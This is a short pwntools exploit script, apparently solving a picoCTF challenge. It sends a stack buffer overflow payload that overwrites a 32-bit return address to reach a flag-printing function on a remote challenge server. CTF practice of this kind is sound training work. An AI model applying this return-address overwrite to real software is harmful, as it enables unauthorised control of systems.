from typing import Callable
import subprocess

from pwn import *

context.arch = "i386"
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"

vuln = ELF("./vuln")


def solve(fact: Callable[[], tube]) -> None:
    p = fact()
    p.recvuntil(b"Enter the secret key: ")
    payload = b""
    payload += b"A" * 32
    payload += b"A" * 12
    payload += p32(0x08049276)
    p.sendline(payload)

    p.recvuntil(b"Flag: ")
    flag = p.recvline().strip()
    p.close()

    print(flag.decode())


def main() -> None:
    # gdb.attach(p, gdbscript="display /4i $pc\ncontinue\n")
    # p = lambda: process(["./heapedit"])
    p = lambda: remote("dolphin-cove.picoctf.net", 63175)
    solve(p)

    # cmd = ["qemu-i386", "-g", "1234", "./vuln", *payload().split(b" ")]
    # print(cmd)
    # subprocess.run(cmd)


if __name__ == "__main__":
    main()
